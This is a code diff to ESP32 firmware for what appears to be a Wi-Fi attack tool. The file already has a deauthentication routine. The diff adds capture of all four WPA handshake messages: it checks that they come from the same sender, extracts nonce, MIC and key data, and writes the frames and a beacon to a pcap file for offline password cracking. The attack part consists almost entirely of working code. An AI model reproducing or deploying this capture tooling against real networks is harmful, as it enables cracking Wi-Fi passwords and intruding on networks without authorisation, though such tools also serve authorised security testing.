@@ -8,6 +8,7 @@
 #include "esp_log.h"
 //#include "wifi_ieee80211.h"
 #include "wifi_attack.h"
+#include "../components/libpcap-esp32/libpcap_file_generator.h"
 
 
 esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
@@ -31,6 +32,14 @@ volatile bool hshake1 = false;
 volatile bool hshake2 = false;
 volatile bool hshake3 = false;
 volatile bool hshake4 = false;
+
+/*
+* This variable is used to store the HANDSHAKE MESSAGE M1 sender
+* to ensure that other messager are from the same handshake sequence
+*/
+static unsigned char handshake_m1_sender[6] = { 0 };
+struct libwifi_wpa_auth_data handshake[4] = { 0 };
+
 
 
 void wifi_attack_init(void){
@@ -108,6 +117,68 @@ void send_deauth_packet(unsigned char* receiver, unsigned char* transmitter, uin
     libwifi_free_deauth(&deauth);
 }
 
+void print_handshake_info(void)
+{
+    printf("\n################ GOT WPA HANDSHAKE! ################\n");
+
+    for( uint8_t i = 0; i < 4; i++ )
+    {
+        printf("MESSAGE M%d!\n", i+1);
+        printf("Version: %d\n", handshake[i].version);
+        printf("Type: %d\n", handshake[i].type);
+        printf("Length: %d\n", handshake[i].length);
+        printf("#### KEY INFO #####\n");
+        printf("Information: %d\n", handshake[i].key_info.information);
+        printf("Key_length: %d\n", handshake[i].key_info.key_length);
+        printf("Replay_counter: %lld\n", handshake[i].key_info.replay_counter);
+        /* Print NONCE */
+        printf("NONCE: ");
+        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.nonce); a++ )
+        {
+            printf("%02X ", handshake[i].key_info.nonce[a]);
+        }
+        printf("\n");
+        /* Print IV */
+        printf("IV: ");
+        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.iv); a++ )
+        {
+            printf("%02X ", handshake[i].key_info.iv[a]);
+        }
+        printf("\n");
+        /* Print RSC */
+        printf("RSC: ");
+        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.rsc); a++ )
+        {
+            printf("%02X ", handshake[i].key_info.rsc[a]);
+        }
+        printf("\n");
+        /* Print ID */
+        printf("ID: ");
+        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.id); a++ )
+        {
+            printf("%02X ", handshake[i].key_info.id[a]);
+        }
+        printf("\n");
+        /* Print MIC */
+        printf("MIC: ");
+        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.mic); a++ )
+        {
+            printf("%02X ", handshake[i].key_info.mic[a]);
+        }
+        printf("\n");
+
+        printf("KEY DATA LENGTH: %d\n", handshake[i].key_info.key_data_length);
+        /* Print key_data */
+        printf("KEY_DATA: ");
+        for( uint8_t a = 0; a < handshake[i].key_info.key_data_length; a++ )
+        {
+            printf("%02X ", handshake[i].key_info.key_data[a]);
+        }
+        printf("\n");
+    }
+    printf("################ END HANDSHAKE INFORMATION ################\n\n\n");
+}
+
 const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
 {
     switch(type) {
@@ -117,6 +188,7 @@ const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
         case WIFI_PKT_MISC: return "MISC";
     }
 }
+
 
 //ISR SNIFFING HANDLER
 IRAM_ATTR void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type)
@@ -154,31 +226,64 @@ IRAM_ATTR void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type
     */
     if (frame.frame_control.type == TYPE_DATA) 
     {
-        //printf("Data frame received from Maroc\n");
         // Ensure the parsed data frame is a WPA handshake
         if (libwifi_check_wpa_handshake(&frame) > 0)
         {
             volatile int part = libwifi_check_wpa_message(&frame);  
             if(part == HANDSHAKE_M1){
+                PCAPFILE *pfl = lpcap_create("/fat/pcap.pcap");
+                /* Save handshake sender */
+                memcpy(&handshake_m1_sender, &frame.header.mgmt_ordered.addr3, sizeof(frame.header.mgmt_ordered.addr3));
                 hshake1 = true;
-                //pcap_serializer_append_frame(ppkt->payload, ppkt->rx_ctrl.sig_len, ppkt->rx_ctrl.timestamp);
-            }else if( part == HANDSHAKE_M2){
-                hshake2 = true;
-                //pcap_serializer_append_frame(ppkt->payload, ppkt->rx_ctrl.sig_len, ppkt->rx_ctrl.timestamp);
-            }else if( part == HANDSHAKE_M3){
-                hshake3 = true;
-                //pcap_serializer_append_frame(ppkt->payload, ppkt->rx_ctrl.sig_len, ppkt->rx_ctrl.timestamp);
-            }else if( part == HANDSHAKE_M4){
-                hshake4 = true;
-                //pcap_serializer_append_frame(ppkt->payload, ppkt->rx_ctrl.sig_len, ppkt->rx_ctrl.timestamp);
+                libwifi_get_wpa_data(&frame, &handshake[0]);
+
+                packet_t pkt = { 0 };
+                memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
+                pkt.p_len = data_len;
+                packet_write_pcap(pfl, &pkt);
+                lpcap_close_file( pfl );
+
+            }else if( part == HANDSHAKE_M2 && hshake1 == true ){
+                if( isEqual(frame.header.mgmt_ordered.addr1, (unsigned char *)&handshake_m1_sender) )
+                {
+                    hshake2 = true;
+                    libwifi_get_wpa_data(&frame, &handshake[1]);
+
+                    packet_t pkt = { 0 };
+                    memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
+                    pkt.p_len = data_len;
+                    packet_append_pcap(&pkt);
+                }
+
+            }else if( part == HANDSHAKE_M3 && hshake1 == true && hshake2 == true ){
+                if( isEqual(frame.header.mgmt_ordered.addr2, (unsigned char *)&handshake_m1_sender) )
+                {
+                    hshake3 = true;
+                    libwifi_get_wpa_data(&frame, &handshake[2]);
+
+                    packet_t pkt = { 0 };
+                    memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
+                    pkt.p_len = data_len;
+                    packet_append_pcap(&pkt);
+                }
+
+            }else if( part == HANDSHAKE_M4 && hshake1 == true && hshake2 == true && hshake3 == true ){
+                if( isEqual(frame.header.mgmt_ordered.addr1, (unsigned char *)&handshake_m1_sender) )
+                {
+                    hshake4 = true;
+                    libwifi_get_wpa_data(&frame, &handshake[3]);
+                    
+                    packet_t pkt = { 0 };
+                    memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
+                    pkt.p_len = data_len;
+                    packet_append_pcap(&pkt);
+                }
             }
 
             if(hshake1 && hshake2 && hshake3 && hshake4){
-                hshake1 = false;
-                hshake2 = false;
-                hshake3 = false;
-                hshake4 = false;
-                printf("\nGOT WPA HANDSHAKE!\n");
+                //print_handshake_info();
+                ESP_LOGI(TAG, "PCAP Written!");
+                ESP_LOGI(TAG, "Waiting for a beacon frame to complete...");
             }       
         }
 
@@ -222,6 +327,19 @@ IRAM_ATTR void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type
             libwifi_free_bss(&bss);
             goto free_mem;
         }   
+
+        if(hshake1 && hshake2 && hshake3 && hshake4){
+            hshake1 = false;
+            hshake2 = false;
+            hshake3 = false;
+            hshake4 = false;
+            packet_t pkt = { 0 };
+            memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
+            pkt.p_len = data_len;
+            packet_append_pcap(&pkt);
+            ESP_LOGI(TAG, "BEACON FRAME WRITTEN!");
+            vTaskDelay(999999 / portTICK_PERIOD_MS);
+        } 
 
         if(passive_scan == true){
             if(current_scan_result < MAX_SCAN_RESULTS){
